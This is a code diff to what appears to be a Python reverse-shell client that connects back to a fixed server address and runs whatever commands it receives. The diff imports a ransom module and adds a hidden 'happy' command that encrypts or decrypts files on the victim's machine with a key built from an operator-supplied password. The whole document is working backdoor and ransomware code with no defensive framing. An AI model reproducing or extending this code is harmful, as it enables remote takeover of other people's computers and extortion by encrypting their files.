@@ -3,6 +3,7 @@ import os
 import subprocess
 import sys
 import time
+import ransom
 
 # SERVER_HOST = "127.0.0.1"
 SERVER_HOST = "10.0.2.5"
@@ -26,6 +27,16 @@ def autoconn():
         time.sleep(10)
         autoconn()
     cmds(s)
+    
+def ransomProc(cmd):
+    output = ""
+    if cmd[0].lower() == "e":
+        key, salt = ransom.generate_key(cmd[2])
+        output = ransom.enc_det(cmd[1], key)
+    else:
+        key, salt = ransom.generate_key(cmd[2], load_existing_salt=True)
+        output = ransom.dec_det(cmd[1], key)
+    return output
 
 def cmds(s):
     term = False
@@ -38,8 +49,6 @@ def cmds(s):
         if command.lower() == "stop":
             term = True
             break
-        if command.lower() == "happy":
-            pass
     
         if splited_command[0].lower() == "cd":
         # cd command, change directory
@@ -50,6 +59,8 @@ def cmds(s):
                 output = str(e)
             else:
                 output = ""
+        elif splited_command[0].lower() == "happy":
+            output = ransomProc(splited_command[1:])
         else:
             output = subprocess.getoutput(command)
         # get the current working directory as output
